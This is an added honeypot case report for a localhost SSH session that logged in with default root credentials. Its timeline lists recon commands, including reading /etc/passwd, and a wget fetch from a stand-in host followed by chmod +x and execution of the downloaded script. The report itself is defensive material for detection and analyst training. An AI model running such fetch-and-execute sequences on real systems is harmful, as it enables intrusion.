@@ -1,0 +1,132 @@
+========================================
+HONEYBADGER LEVEL 3++ ADVANCED CASE REPORT
+========================================
+
+Case ID: HB-0001-LOCAL-SSH-RECON
+
+==== INCIDENT TIMELINE ====
+
+[2026-03-29T15:40:25Z]
+Successful SSH login using root:toor
+Session: 917bca723bf0
+
+[2026-03-29T15:40:34Z]
+Command executed: whoami
+
+[2026-03-29T15:40:45Z]
+Command executed: pwd
+
+[2026-03-29T15:40:52Z]
+Command executed: uname -a
+
+[2026-03-29T15:40:56Z]
+Command executed: ls
+
+[2026-03-29T15:41:06Z]
+Command executed: cat /etc/passwd
+
+[2026-03-29T15:41:14Z]
+Command executed: ps aux
+
+[2026-03-29T15:41:33Z]
+Command executed: wget http://example.com/test.sh
+
+[2026-03-29T15:41:34Z]
+File download recorded: http://example.com/test.sh
+
+[2026-03-29T15:41:51Z]
+Command executed: curl https://example.com
+
+[2026-03-29T15:41:51Z]
+File download recorded: https://example.com
+
+[2026-03-29T15:42:05Z]
+Command executed: chmod +x test.sh
+
+[2026-03-29T15:42:13Z]
+Command executed: ./test.sh
+
+[2026-03-29T15:42:13Z]
+Anomalous HTML content appeared as shell input
+
+[2026-03-29T15:42:16Z]
+Session ended: exit
+
+
+==== SESSION ANALYSIS ====
+
+Session ID: 917bca723bf0
+- Successful login observed
+- Full attack chain present:
+  Recon → Enumeration → Download → Execution → Exit
+
+Session ID: d1b00f0ef785
+- Successful login observed
+- Partial activity:
+  Recon commands repeated
+  Download attempt observed
+- No confirmed execution phase
+
+Assessment:
+Multiple sessions show repeated behavior patterns, indicating either:
+- Automated attack script OR
+- Same attacker reconnecting
+
+Conclusion:
+Behavior is consistent across sessions, strengthening confidence in malicious intent.
+
+
+==== FALSE POSITIVE ANALYSIS ====
+
+Potential Benign Explanations:
+- Security researcher testing a local Cowrie instance
+- Internal lab simulation
+- Authorized sandbox validation
+- User manually testing default SSH credentials in a controlled environment
+
+Why This Still Matters:
+- The observed sequence strongly matches attacker tradecraft
+- Weak credential login + recon + download + execution is high-signal behavior
+- Even in a lab, this pattern should still trigger detection logic
+
+Analyst Judgment:
+Although the source IP is localhost (127.0.0.1), the behavioral pattern remains valid for detection engineering and SOC workflow simulation.
+
+Conclusion:
+This case is suitable for:
+- Detection testing
+- Analyst training
+- Rule validation
+- Threat hunting practice
+
+
+==============================
+ALERT SUMMARY
+==============================
+
+Alert Name: Suspicious SSH Recon and Execution Activity
+Case ID: HB-0001-LOCAL-SSH-RECON
+Severity: Medium
+Confidence: High
+
+Trigger Reason:
+A successful SSH login using weak credentials was followed by reconnaissance commands, file retrieval, permission modification, and script execution.
+
+Observed Behavior:
+- Successful login as root
+- Host and user discovery
+- File and process enumeration
+- Download via wget and curl
+- chmod +x followed by execution
+- HTML content observed as shell input anomaly
+
+Why This Matters:
+This pattern matches common early-stage attacker behavior after gaining shell access.
+
+Recommended Analyst Action:
+- Review login source IP
+- Validate whether credential use was authorized
+- Inspect downloaded file hash
+- Review session timeline
+- Contain host if activity is unauthorized
+
